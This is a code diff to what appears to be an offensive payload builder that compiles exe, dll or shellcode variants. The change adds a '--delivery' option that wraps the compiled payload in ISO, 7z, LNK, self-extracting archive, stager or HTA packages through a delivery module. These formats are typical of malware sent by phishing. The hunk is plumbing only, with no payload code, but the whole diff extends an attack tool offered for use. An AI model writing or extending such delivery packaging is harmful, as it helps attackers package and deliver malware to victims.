@@ -1527,6 +1527,9 @@ def main():
                         help="Random seed for reproducible variant selection")
     parser.add_argument("--format", choices=["exe", "dll", "shellcode"], default="exe",
                         help="Output format (default: exe)")
+    parser.add_argument("--delivery", nargs="+",
+                        choices=["iso", "7z", "lnk", "sfx", "stager", "hta"],
+                        help="Delivery packaging methods to generate")
 
     args = parser.parse_args()
 
@@ -1586,6 +1589,27 @@ def main():
     if args.compile and getattr(args, "format", "exe") == "shellcode":
         sc_path = args.output.replace(".c", ".bin")
         extract_shellcode(exe_path, sc_path)
+
+    # Delivery packaging
+    if args.delivery and args.compile:
+        output_dir = os.path.dirname(os.path.abspath(args.output))
+        payload_path = None
+        for ext in ('.exe', '.dll', '.cpl'):
+            candidate = args.output.replace(".c", ext)
+            if os.path.exists(candidate):
+                payload_path = candidate
+                break
+        if not payload_path and fmt in ("jscript", "vbscript", "batch"):
+            payload_path = args.output
+
+        if payload_path:
+            from templates.chunks.delivery import package as delivery_package
+            results = delivery_package(payload_path, output_dir, methods=args.delivery)
+            for method, result in results.items():
+                if result.success:
+                    print(f"Delivery [{method}]: {result.path} ({result.size:,} bytes)")
+                else:
+                    print(f"Delivery [{method}]: FAILED - {result.error}")
 
 
 if __name__ == "__main__":
